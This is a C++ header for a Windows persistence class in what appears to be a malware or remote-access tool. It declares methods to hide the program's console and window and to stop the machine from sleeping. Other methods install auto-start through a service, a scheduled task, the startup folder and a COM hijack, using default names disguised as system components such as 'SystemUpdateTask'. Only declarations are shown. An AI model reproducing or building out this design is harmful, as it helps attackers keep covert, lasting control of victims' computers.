#pragma once

#include <atomic>
#include <functional>
#include <string>
#include <thread>

#include "application/interfaces/IPersistenceService.hpp"

namespace nuub::infrastructure::system {

class WindowsPersistence final : public application::interfaces::IPersistenceService {
    std::string pc_id_;
    std::string auto_start_name_;
    std::atomic<bool> anti_sleep_running_{false};
    std::thread anti_sleep_thread_;
    std::function<void()> on_shutdown_;

    void anti_sleep_loop();

public:
    WindowsPersistence(std::string pc_id, std::string auto_start_name = "SystemCoreService");

    void invoke_shutdown();

    // IPersistenceService
    void configure_auto_start() override;
    void hide_console() override;
    void start_anti_sleep() override;
    void stop_anti_sleep() override;
    void create_hidden_window(std::function<void()> on_shutdown) override;
    void pump_messages() override;

    // Advanced persistence (selectable at runtime)
    bool install_service(const std::string& service_name = "SystemCoreSvc");
    bool install_scheduled_task(const std::string& task_name = "SystemUpdateTask");
    bool install_startup_folder(const std::string& shortcut_name = "sysupdate");
    bool install_com_hijack(const std::string& clsid = "50F79E2C-6E08-4F83-A5E0-8A3B1D5F6A2C");

    // Remove all persistence
    void remove_all_persistence();
};

} // namespace nuub::infrastructure::system
